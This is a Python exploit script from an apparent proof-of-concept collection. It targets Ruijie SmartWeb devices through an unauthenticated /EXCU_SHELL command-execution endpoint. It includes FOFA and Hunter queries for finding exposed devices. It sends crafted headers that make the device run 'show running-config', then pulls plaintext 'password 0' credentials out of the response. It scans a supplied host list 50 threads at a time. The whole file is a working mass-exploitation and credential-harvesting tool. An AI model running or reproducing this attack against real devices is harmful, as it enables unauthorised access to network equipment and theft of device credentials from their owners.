#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa:server="GoAheadWebs"//不准确
# hunter:body="img/free_login_ge.gif" && body="./img/login_bg.gif"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Ruijie_SmartWeb_Execshell_Leak_Poc.py url.txt                                               +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Disposition": "form-data; name=\"file\"; filename=\"test.php\"",
        "Host": "%s" %host2,
        "Cmdnum": "'1'",
        "Command1": "show running-config",
        "Confirm1": "n",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    vulurl = url + "/EXCU_SHELL"
    data='test'
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False)
        #print(r.text)
        if "Building configuration" in r.text :
            b=r.text.find('password 0')
            print(url+"    "+r.text[b-11:b+19])
            #print(r.text)     
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])